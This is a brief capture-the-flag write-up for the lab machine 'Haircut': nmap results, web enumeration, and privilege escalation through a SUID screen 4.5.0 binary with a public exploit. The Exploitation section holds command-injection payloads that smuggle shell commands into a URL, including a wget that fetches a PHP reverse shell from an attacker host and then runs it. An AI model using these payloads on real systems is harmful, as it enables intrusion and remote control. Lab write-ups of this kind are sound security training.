# Haircut

### Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enum

```

http://10.10.10.24/test.html

http://10.10.10.24/hair.html

http://10.10.10.24/uploads/

http://10.10.10.24/exposed.php -> vector
```

### Exploitation

```bash
# cmd inject point
http://10.10.10.24/exposed.php

# poc
http://localhost/$(echo 'test').html -> http://localhost/test.html
http://localhost/$(ping -c 2 10.10.14.29).html -> got icmp back

# get shell
http://localhost/$(wget 10.10.14.29:9000/php-reverse-shell.php -O /tmp/shell.php).html
http://localhost/$(php /tmp/shell.php).html 

```

### Priv Esc

```bash
# PE vector
-rwsr-xr-x 1 root root 1.6M May 19  2017 /usr/bin/screen-4.5.0 (Unknown SUID binary)

# public exploit
GNU Screen 4.5.0 - Local Privilege Escalation  | linux/local/41154.sh

# follow exploit to get shell
```
